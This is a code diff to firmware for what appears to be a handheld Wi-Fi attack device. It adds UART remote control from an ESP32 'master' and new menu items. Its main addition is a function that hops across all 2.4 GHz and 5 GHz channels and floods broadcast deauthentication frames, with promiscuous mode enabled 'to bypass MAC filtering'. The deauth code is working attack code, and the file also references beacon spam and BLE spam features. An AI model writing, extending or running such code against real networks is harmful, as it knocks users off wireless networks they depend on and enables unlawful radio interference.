@@ -23,6 +23,7 @@
 #include "BleSpam.h"
 #include "ClientScanner.h"
 #include "Theme.h"
+#include "UartProtocol.h"
 
 // ─────────────────────────────────────────────────────────────
 //  UI State machine
@@ -55,7 +56,8 @@ enum UiState {
   UI_IR_MENU,
   UI_ACTION_MENU,
   UI_CLIENT_LIST,
-  UI_CLIENT_SCANNING
+  UI_CLIENT_SCANNING,
+  UI_SLAVE_LINKED
 };
 
 // ─────────────────────────────────────────────────────────────
@@ -65,6 +67,8 @@ enum UiState {
 static const char *const MAIN_MENU_ITEMS[] = {
   "Scan Networks",
   "Target / Deauth",
+  "Deauth 5G (All)",
+  "Deauth 2.4G (All)",
   "Beacon Spam",
   "Sniffer",
   "BLE Tools",
@@ -318,10 +322,23 @@ void setup() {
 
   ledAllOff();
   ledFlashGreen(3, 80);
-  buzzerScanDone();
   setLedMode(LED_MODE_IDLE);
 
-  drawMainMenu();
+  // Initialize Master/Slave UART Protocol on 115200 baud
+  uartProtocolBegin(115200);
+
+  // Auto-detect Master (TetraX ESP32) on UART with 2.0s handshake
+  uiDrawGenericMessage("MASTER SEARCH", "Searching TetraX...", "UART 115200 (2s)");
+  if (uartCheckMasterHandshake(2000)) {
+    setSystemMode(SYS_MODE_SLAVE);
+    uiState = UI_SLAVE_LINKED;
+    uiDrawSlaveLinked("TetraX ESP32");
+    buzzerScanDone();
+  } else {
+    setSystemMode(SYS_MODE_STANDALONE);
+    buzzerScanDone();
+    drawMainMenu();
+  }
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -329,7 +346,34 @@ void setup() {
 // ─────────────────────────────────────────────────────────────
 
 void loop() {
-  // ── Button reading ──────────────────────────────────────────
+  // ── UART Remote Commands (From TetraX Master) ────────────────
+  UartCommand ucmd = uartPollCommand();
+  if (ucmd.type != UART_CMD_NONE) {
+    if (ucmd.type == UART_CMD_NAV) {
+      handleNav();
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_OK) {
+      handleOk();
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_BACK || ucmd.type == UART_CMD_STOP) {
+      emergencyBack();
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_DEAUTH_ALL_24) {
+      runDeauthAllChannels(2);
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_DEAUTH_ALL_5G) {
+      runDeauthAllChannels(5);
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_BEACON_24) {
+      if (beaconSpamStart(2)) { uiState = UI_BEACON_SPAM; uiDrawBeaconSpam(); }
+      goto after_buttons;
+    } else if (ucmd.type == UART_CMD_BEACON_5G) {
+      if (beaconSpamStart(5)) { uiState = UI_BEACON_SPAM; uiDrawBeaconSpam(); }
+      goto after_buttons;
+    }
+  }
+
+  // ── Physical Button reading ──────────────────────────────────
   // OK  = TTP223 touch sensor (PB20, active HIGH)
   //   Short tap  → handleOk()
   //   Long hold  → UNIVERSAL emergency back (handleBack from ANY state)
@@ -820,8 +864,14 @@ void emergencyBack() {
   delay(60);
   buzzerBeep(1000, 80);
   
-  // Always go back to main menu
-  drawMainMenu();
+  if (getSystemMode() == SYS_MODE_SLAVE) {
+    uiState = UI_SLAVE_LINKED;
+    uiDrawSlaveLinked("TetraX ESP32");
+    uartSendStatus("IDLE");
+  } else {
+    // Always go back to main menu
+    drawMainMenu();
+  }
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -857,26 +907,34 @@ void openMainMenuItem() {
       }
       break;
     case 2:
+      // Deauth 5G (All Channels)
+      runDeauthAllChannels(5);
+      break;
+    case 3:
+      // Deauth 2.4G (All Channels)
+      runDeauthAllChannels(2);
+      break;
+    case 4:
       // Beacon Spam
       selectedBand = 2;
       uiState = UI_BAND_MENU;
       uiDrawBandMenu(selectedBand);
       break;
-    case 3:
+    case 5:
       // Sniffer
       startSniffer(2);
       break;
-    case 4:
+    case 6:
       // BLE Tools
       drawBleMenu();
       break;
-    case 5:
+    case 7:
       // IR Remote
       uiState = UI_IR_MENU;
       irMenuIndex = 0;
       uiDrawIrMenu(irMenuIndex);
       break;
-    case 6: {
+    case 8: {
       // System Info
       uiState = UI_SYSTEM_INFO;
       uint8_t c24 = wifiScannerCountBand(2);
@@ -1196,6 +1254,79 @@ bool runPacketInjectionLab() {
   }
 }
 
+bool runDeauthAllChannels(uint8_t band) {
+  static const uint8_t CHANNELS_24[] = { 1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13 };
+  static const uint8_t CHANNELS_5[]  = { 36, 40, 44, 48, 149, 153, 157, 161 };
+
+  uint8_t count = (band == 5) ? (uint8_t)(sizeof(CHANNELS_5) / sizeof(CHANNELS_5[0])) : (uint8_t)(sizeof(CHANNELS_24) / sizeof(CHANNELS_24[0]));
+  const uint8_t *chList = (band == 5) ? CHANNELS_5 : CHANNELS_24;
+
+  uiDrawGenericMessage("ALL-CH ATTACK", band == 5 ? "5GHz All Channels" : "2.4GHz All Channels", "Activating Mode...");
+  ledFlashGreen(1, 100);
+
+  wifi_off();
+  delay(150);
+  wifi_on(RTW_MODE_STA);
+  delay(150);
+  wifi_change_channel_plan(0x7F);
+  delay(100);
+
+  // Enable Promiscuous Mode to bypass MAC filtering
+  wifi_set_promisc(3, NULL, 0); // 3 = RTW_PROMISC_ENABLE_2
+
+  bool anySent = false;
+  uint32_t sentCount = 0;
+  uint32_t lastUiUpdate = millis();
+  uint8_t broadcastMac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+  uint8_t fakeApMac[6]    = { 0x02, 0x11, 0x22, 0x33, 0x44, 0x55 };
+
+  uiDrawDeauthScreen(band == 5 ? "ALL 5G CHANNELS" : "ALL 2.4G CHANNELS", chList[0], band == 5, 0);
+
+  uint8_t chIndex = 0;
+
+  while (true) {
+    if (anyButtonPressed()) {
+      return stopPacketInjectionLab(anySent, sentCount);
+    }
+
+    UartCommand cmd = uartPollCommand();
+    if (cmd.type == UART_CMD_STOP || cmd.type == UART_CMD_BACK) {
+      return stopPacketInjectionLab(anySent, sentCount);
+    }
+
+    uint8_t curCh = chList[chIndex];
+    wifi_set_channel(curCh);
+    delay(20);
+
+    // Burst on current channel
+    for (uint8_t burst = 0; burst < 10; burst++) {
+      if (anyButtonPressed()) return stopPacketInjectionLab(anySent, sentCount);
+
+      bool sent = wifi_tx_deauth_frame(fakeApMac, broadcastMac, fakeApMac, LAB_DEAUTH_REASON);
+      if (sent) {
+        anySent = true;
+        sentCount++;
+        ledGreenOn();
+      } else {
+        delay(15);
+      }
+      delay(10);
+    }
+    ledGreenOff();
+
+    // DMA flush yield
+    delay(50);
+
+    if (millis() - lastUiUpdate > 100) {
+      lastUiUpdate = millis();
+      uiRefreshDeauthCounter(sentCount);
+      uartSendStatus("TX", sentCount);
+    }
+
+    chIndex = (chIndex + 1) % count;
+  }
+}
+
 bool stopPacketInjectionLab(bool anySent, uint32_t sentCount) {
   labInjectionStoppedByUser = true;
   ledAllOff();
@@ -1212,6 +1343,12 @@ bool stopPacketInjectionLab(bool anySent, uint32_t sentCount) {
   wifi_on(RTW_MODE_STA);
   wifi_change_channel_plan(0x7F);
   delay(150);
+
+  if (getSystemMode() == SYS_MODE_SLAVE) {
+    uiState = UI_SLAVE_LINKED;
+    uiDrawSlaveLinked("TetraX ESP32");
+    uartSendStatus("STOPPED", sentCount);
+  }
 
   waitForLabButtonsReleased();
   return anySent;
